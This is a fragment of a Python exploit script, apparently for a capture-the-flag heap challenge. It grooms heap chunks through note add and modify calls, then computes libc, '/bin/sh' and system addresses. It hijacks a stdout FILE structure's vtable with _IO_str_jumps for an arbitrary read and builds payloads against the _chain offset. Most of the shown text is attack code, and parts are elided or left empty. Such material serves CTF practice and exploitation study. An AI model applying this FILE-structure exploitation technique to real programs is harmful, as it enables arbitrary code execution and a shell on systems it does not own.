...
#0x428
fake_file = base64.b64decode("")

add_note("1 1064","test1")
#0x418
add_note("2 1048","test2")

modify_note("1 1064","tipstest1") #malloc(p1)
add_note("3 1048","test3" )
add_note("4 1080","notetest4")
...
#debug
libc_address = note_data - 0x1b8ff0
bin_sh_address = libc_address + 0x0000000000181e66
print("bin_sh_address",hex(bin_sh_address))
system_address = libc_address + libc.symbols["system"]

_IO_str_jumps = libc_address + 0x1ba580 
...
def get_arbitrary_read():
    ...
    io_stdout_struct.vtable = _IO_str_jumps
...
# 0x1b9648 _chain的偏移
payload = p64(libc_address+0x1b8a08-0x20)*4
#print(note_data)
#leak_address()
payload = p64(0)
